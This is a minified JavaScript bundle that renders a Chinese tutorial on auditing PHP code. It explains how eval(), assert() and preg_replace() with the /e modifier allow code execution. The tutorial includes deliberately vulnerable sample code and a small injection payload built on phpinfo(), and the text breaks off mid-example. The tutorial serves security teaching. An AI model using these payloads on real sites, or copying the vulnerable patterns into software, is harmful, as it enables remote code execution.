(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[10],{152:function(a,e,n){"use strict";n.r(e),function(a){n.d(e,"default",(function(){return i}));var t,s=n(95),p=(n(139),n(0),n(96));function c(){return(c=Object.assign||function(a){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var t in n)Object.prototype.hasOwnProperty.call(n,t)&&(a[t]=n[t])}return a}).apply(this,arguments)}function b(a,e){if(null==a)return{};var n,t,s=function(a,e){if(null==a)return{};var n,t,s={},p=Object.keys(a);for(t=0;t<p.length;t++)n=p[t],e.indexOf(n)>=0||(s[n]=a[n]);return s}(a,e);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(a);for(t=0;t<p.length;t++)n=p[t],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(a,n)&&(s[n]=a[n])}return s}(t="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&t(a);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var m,r,o=function(a){return function(e){return console.warn("Component "+a+" was not imported, exported, or provided by MDXProvider as global scope"),Object(p.b)("div",e)}},N={},l="wrapper";function i(a){var e=a.components,n=b(a,["components"]);return Object(p.b)(l,c({},N,n,{components:e,mdxType:"MDXLayout"}),Object(p.b)("h1",{className:"__internal",id:"php代码审计基础知识"},"PHP代码审计基础知识",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h2",{className:"__internal",id:"前言"},"前言",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%89%8D%E8%A8%80","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"本文章主要是PHP代码审计的一些基础知识，包括函数的用法，漏洞点，偏向基础部分，个人能力有限，部分可能会出现错误或者遗漏，读者可自行补充。"),Object(p.b)("h2",{className:"__internal",id:"代码执行"},"代码执行",Object(p.b)("a",c({parentName:"h2"},{href:"#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码执行是代码审计当中较为严重的漏洞，主要是一些命令执行函数的不适当使用。那么，常见的能够触发这类漏洞的函数有哪些呢？"),Object(p.b)("h3",{className:"__internal",id:"eval"},"eval()",Object(p.b)("a",c({parentName:"h3"},{href:"#eval","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"想必大家对",Object(p.b)("inlineCode",{parentName:"p"},"eval()"),"函数应该并不陌生，简而言之",Object(p.b)("inlineCode",{parentName:"p"},"eval()"),"函数就是将传入的字符串当作 ",Object(p.b)("inlineCode",{parentName:"p"},"PHP")," 代码来进行执行。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," mixed"))),Object(p.b)("h4",{className:"__internal",id:"返回值"},"返回值",Object(p.b)("a",c({parentName:"h4"},{href:"#%E8%BF%94%E5%9B%9E%E5%80%BC","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"eval()")," 返回 ",Object(p.b)("inlineCode",{parentName:"p"},"NULL"),"，除非在执行的代码中 return了一个值，函数返回传递给 return的值。PHP7开始，执行的代码里如果有一个parse error，",Object(p.b)("inlineCode",{parentName:"p"},"eval()")," 会抛出 ParseError 异常。在 PHP 7 之前，如果在执行的代码中有 parse error，",Object(p.b)("inlineCode",{parentName:"p"},"eval()")," 返回",Object(p.b)("inlineCode",{parentName:"p"},"FALSE"),"，之后的代码将正常执行。无法使用",Object(p.b)("inlineCode",{parentName:"p"},"set_error_handler()"),"捕获 ",Object(p.b)("inlineCode",{parentName:"p"},"eval()")," 中的解析错误。 "),Object(p.b)("p",null,"也就是说，我们在利用",Object(p.b)("inlineCode",{parentName:"p"},"eval()"),"函数的时候，如果我们传入的字符串不是正常的代码格式，那么就会抛出异常。所以PHP7和PHP5在这部分最大的不同是什么呢？简而言之，PHP5在代码错误格式错误之后仍会执行，而PHP7在代码发生错误之后，那么",Object(p.b)("inlineCode",{parentName:"p"},"eval()"),"函数就会抛出异常，而不执行之后的代码。"),Object(p.b)("p",null,"示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"echo 'This is a PHP7';\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n执行结果——>This is a PHP7"))),Object(p.b)("p",null,"那么如果我要执行系统命令呢？这个时候就需要用到PHP中的",Object(p.b)("inlineCode",{parentName:"p"},"system"),"函数。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"system('whoami');\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n执行结果——>desktop-m61j5j6\\admin"))),Object(p.b)("p",null,"那么到此，我们就可以结合其他姿势通过这个函数实现任意代码执行了。"),Object(p.b)("h3",{className:"__internal",id:"assert"},"assert()",Object(p.b)("a",c({parentName:"h3"},{href:"#assert","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"PHP 5"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$assertion"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$description"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("p",null,"PHP 7"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$assertion"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," Throwable ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$exception"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("h4",{className:"__internal",id:"参数"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("strong",{parentName:"li"},"assertion"))),Object(p.b)("p",null,"断言。在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。"),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("strong",{parentName:"li"},"description"))),Object(p.b)("p",null,"如果",Object(p.b)("inlineCode",{parentName:"p"},"assertion"),"失败了，选项",Object(p.b)("inlineCode",{parentName:"p"},"description"),"将会包含在失败信息里。"),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("strong",{parentName:"li"},"exception"))),Object(p.b)("p",null,"在PHP 7中，第二个参数可以是一个",Object(p.b)("inlineCode",{parentName:"p"},"Throwable"),"对象，而不是一个字符串，如果断言失败且启用了",Object(p.b)("inlineCode",{parentName:"p"},"assert.exception"),"，那么该对象将被抛出"),Object(p.b)("h4",{className:"__internal",id:"assert配置"},"assert()配置",Object(p.b)("a",c({parentName:"h4"},{href:"#assert%E9%85%8D%E7%BD%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("table",null,Object(p.b)("thead",{parentName:"table"},Object(p.b)("tr",{parentName:"thead"},Object(p.b)("th",c({parentName:"tr"},{align:null}),"配置项"),Object(p.b)("th",c({parentName:"tr"},{align:null}),"默认值"),Object(p.b)("th",c({parentName:"tr"},{align:"left"}),"可选值"))),Object(p.b)("tbody",{parentName:"table"},Object(p.b)("tr",{parentName:"tbody"},Object(p.b)("td",c({parentName:"tr"},{align:null}),"zend.assertions"),Object(p.b)("td",c({parentName:"tr"},{align:null}),"1"),Object(p.b)("td",c({parentName:"tr"},{align:"left"}),"1 - 生成和执行代码(开发模式)                                                                                              0 - 生成代码，但在执行时跳过它                                                                                      -1 - 不生成代码(生产环境)")),Object(p.b)("tr",{parentName:"tbody"},Object(p.b)("td",c({parentName:"tr"},{align:null}),"assert.exception"),Object(p.b)("td",c({parentName:"tr"},{align:null}),"0"),Object(p.b)("td",c({parentName:"tr"},{align:"left"}),"1 - 断言失败时抛出，可以抛出异常对象，如果没有提供异常，则抛出AssertionError对象实例                                                                                                0 - 使用或生成Throwable，仅仅是基于对象生成的警告而不是抛出对象(与PHP 5 兼容)")))),Object(p.b)("p",null,"所以搞了这么多，",Object(p.b)("inlineCode",{parentName:"p"},"assert()"),"函数到底是干什么的呢？用我的理解来说，",Object(p.b)("inlineCode",{parentName:"p"},"assert()"),"函数是处理异常的一种形式，相当于一个if条件语句的宏定义一样。"),Object(p.b)("p",null,"一个PHP 7 中的示例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert_options"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"ASSERT_EXCEPTION"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"    ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 设置在断言失败时产生异常"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"try")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"AssertionError"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'因为1不等于2，所以前面断言失败，抛出异常'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"  ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 用 AssertionError 异常替代普通字符串"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"catch")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),"Throwable ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$error"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$error"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"getMessage"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n    \n执行结果——>因为1不等于2，所以前面断言失败，抛出异常"))),Object(p.b)("p",null,"这里就是实例化一个对象，用这个对象来抛出异常。"),Object(p.b)("p",null,"一个php 5 中的示例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'前面断言失败，抛出异常'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>Warning: assert(): 前面断言失败，抛出异常 failed in D:\\phpstudy_pro\\WWW\\1.php on line 2\n    \n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>Warning: assert(): Assertion failed in D:\\phpstudy_pro\\WWW\\1.php on line 2"))),Object(p.b)("p",null,"所以PHP 7 相较于PHP 5 就是多了个用Throwable来发出警告。"),Object(p.b)("p",null,"那么，如果前面断言成功呢？会发生什么呢?来个最简单，也是我们比较喜欢的示例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"system(whoami)"'),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>desktop-m61j5j6\\admin"))),Object(p.b)("p",null,"这段代码在PHP 5 和PHP 7 中都会返回命令执行结果，虽然PHP 7 中对断言函数的参数稍作了改变，但是为了兼容低版本，所以还是会直接返回结果。"),Object(p.b)("h3",{className:"__internal",id:"preg_replace"},"preg_replace()",Object(p.b)("a",c({parentName:"h3"},{href:"#preg_replace","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"通过函数名字我们也应该能够了解函数大概作用，此函数执行一个正则表达式的搜索和替换。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"mixed preg_replace ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$pattern")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$replacement")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$subject")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$limit")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$count")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("p",null,"搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。"),Object(p.b)("h4",{className:"__internal",id:"参数说明："},"参数说明：",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$pattern: 要搜索的模式，可以是字符串或一个字符串数组。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$replacement: 用于替换的字符串或字符串数组。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$subject: 要搜索替换的目标字符串或字符串数组。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"$count: 可选，为替换执行的次数。")),Object(p.b)("p",null,"那这个函数跟我们命令执行有什么关系呢？仅仅看上面的官方解释似乎看不出什么，但是",Object(p.b)("inlineCode",{parentName:"p"},"preg_repace()"),"有一个模式是/e模式，这个模式就会发生代码执行的问题，为什么呢？"),Object(p.b)("p",null,"看一个案例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n     ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$regex"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"preg_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'/('")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$regex")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"')/ei'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'strtolower(\"\\\\1\")'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"foreach")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"as")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$regex")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$regex"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"上面这段我们需要注意的就是\\1,\\1在正则表达式是反向引用的意思，简而言之就是指定一个子匹配项。"),Object(p.b)("p",null,"针对上面案例，我们来个payload："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"payload",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"?"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"phpinfo"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n所以语句就成了这样\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"preg_replace"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'/(.*)/ei'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'strtolower(\"\\\\1\")'"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"phpinfo"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(p.b)("p",null,"那么我们直接把这段代码放到页面"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"preg_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'/(.*)/ei'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'strtolower(\"\\\\1\")'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," 